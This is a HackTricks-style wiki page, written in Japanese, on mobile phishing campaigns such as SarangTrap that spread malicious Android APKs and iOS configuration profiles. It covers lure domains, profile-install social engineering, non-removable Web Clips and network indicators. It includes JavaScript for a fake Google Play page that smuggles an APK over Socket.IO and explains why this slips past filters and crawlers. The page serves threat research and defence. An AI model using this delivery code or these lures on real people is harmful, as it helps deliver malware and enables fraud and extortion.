# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページでは、脅威アクターが phishing（SEO、ソーシャルエンジニアリング、偽ストア、dating apps など）を通じて、**malicious Android APKs** や **iOS mobile-configuration profiles** を配布するために使用する手法を扱います。
> 内容は、Zimperium zLabs（2025）が公開した SarangTrap campaign およびその他の公開 research をもとにしています。<sup>[[1]](#references)</sup>

## Attack Flow

1. **SEO/Phishing Infrastructure**
* dating、cloud share、car service などを装った look-alike domains を数十件登録する。
– `<title>` 要素に現地語の keywords と emojis を使用し、Google での ranking を高める。
– 同じ landing page 上で、Android（`.apk`）と iOS の install instructions の**両方**をホストする。
2. **First Stage Download**
* Android: *unsigned* または “third-party store” APK への直接リンク。
* iOS: 悪意のある **mobileconfig** profile への `itms-services://` または通常の HTTPS link（下記参照）。
3. **Android Post-install Behaviour**
* C2-gated execution、permission abuse、dropper bypasses、background collection、その他の post-install malware behaviour については、下記の専用 Android Malware Post-Exploitation page で扱います。
4. **iOS Delivery Technique**
* 1つの **mobile-configuration profile** で、`PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` などを要求し、device を “MDM” に似た supervision に enroll できる。
* Social-engineering instructions:
1. Settings ➜ *Profile downloaded* を開く。
2. *Install* を3回 tap する（phishing page に screenshots を掲載）。
3. unsigned profile を trust する ➜ App Store review なしで、attacker が *Contacts* と *Photo* の entitlement を取得する。
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads により、branded icon/label 付きの phishing URL を **Home Screen に pin** できる。
* Web Clips は **full-screen** で実行できる（browser UI を隠す）ほか、**non-removable** に設定できるため、icon を削除するには victim が profile を削除する必要がある。<sup>[[3]](#references)</sup>
6. **Network Layer**
* Plain HTTP。多くの場合 port 80 で、`api.<phishingdomain>.com` のような HOST header を使用する。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLS なし → 簡単に発見できる）。

## Android Malware Post-Exploitation

C2、Accessibility abuse、overlays、ATS automation、staged DEX loading、premium SMS、persistence など、post-install Android malware tradecraft については、以下のページを参照してください。

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attacker は、static APK links を Google Play に見せかけた lure に埋め込まれた Socket.IO/WebSocket channel に置き換えるケースを増やしています。これにより payload URL を隠し、URL/extension filters を bypass し、現実的な install UX を維持できます。<sup>[[2]](#references)[[4]](#references)</sup>

実際の環境で確認された typical client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

単純な controls を回避できる理由:
- 静的な APK URL は公開されず、payload は WebSocket frames からメモリ上で再構築される。
- 直接的な .apk response をブロックする URL/MIME/extension filters では、WebSockets/Socket.IO 経由でトンネルされた binary data を見逃す可能性がある。
- WebSockets を実行しない crawlers や URL sandboxes は payload を取得できない。

WebSocket tradecraft と tooling も参照:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [ロマンスの暗黒面: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Apple devices 向け Web Clips payload settings](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [インドネシアおよびベトナムの Android Users を標的とする Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
